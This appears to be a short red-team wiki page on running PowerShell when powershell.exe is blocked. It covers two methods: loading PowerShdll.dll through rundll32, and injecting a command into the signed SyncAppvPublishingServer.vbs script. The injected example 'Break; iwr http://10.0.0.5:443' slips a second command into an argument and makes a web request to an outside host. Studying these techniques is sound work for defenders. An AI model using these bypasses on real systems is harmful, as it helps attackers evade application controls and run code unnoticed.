# Powershell Without Powershell.exe

Powershell.exe is just a process hosting the System.Management.Automation.dll which essentially is the actual Powershell as we know it.

If you run into a situation where powershell.exe is blocked and no strict application whitelisting is implemented, there are ways to execute powershell still.

## PowerShdll

```text
rundll32.exe PowerShdll.dll,main
```

![](../../.gitbook/assets/pwshll-rundll32.gif)

Note that the same could be achieved with a compiled .exe binary from the same project, but keep in mind that .exe is more likely to run into whitelisting issues.

## SyncAppvPublishingServer

Windows 10 comes with `SyncAppvPublishingServer.exe and` `SyncAppvPublishingServer.vbs` that can be abused with code injection to execute powershell commands from a Microsoft signed script:

```text
SyncAppvPublishingServer.vbs "Break; iwr http://10.0.0.5:443"
```

![](../../.gitbook/assets/pwshll-syncappvpublishingserver.png)

![](../../.gitbook/assets/pwshll-syncappvpublishingserver.gif)

## References

{% embed url="https://github.com/p3nt4/PowerShdll" %}

{% embed url="https://safe-cyberdefense.com/malware-can-use-powershell-without-powershell-exe/" %}

{% embed url="https://www.youtube.com/watch?v=7tvfb9poTKg" %}

